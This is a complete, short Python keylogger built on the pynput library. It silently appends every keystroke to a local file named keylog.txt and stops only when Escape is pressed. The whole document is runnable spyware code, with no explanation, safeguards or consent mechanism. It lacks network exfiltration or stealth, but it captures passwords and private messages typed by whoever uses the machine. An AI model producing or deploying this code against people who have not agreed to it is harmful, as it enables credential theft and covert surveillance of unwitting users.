from pynput.keyboard import Key, Listener


# Function to write the pressed key to the log file
def write_to_file(key):
    # Open the log file in append mode and write the key
    with open("keylog.txt", "a") as f:
        f.write(str(key) + "\n")

# Function to handle key press events
def on_press(key):
    # Write the pressed key to the log file
    write_to_file(key)

# Function to handle key release events
def on_release(key):
    # If the Escape key is pressed, stop the keylogger
    if key == Key.esc:
        return False

# Start listening for key events
with Listener(on_press=on_press, on_release=on_release) as listener:
    # Block the main thread until the keylogger is stopped
    listener.join()
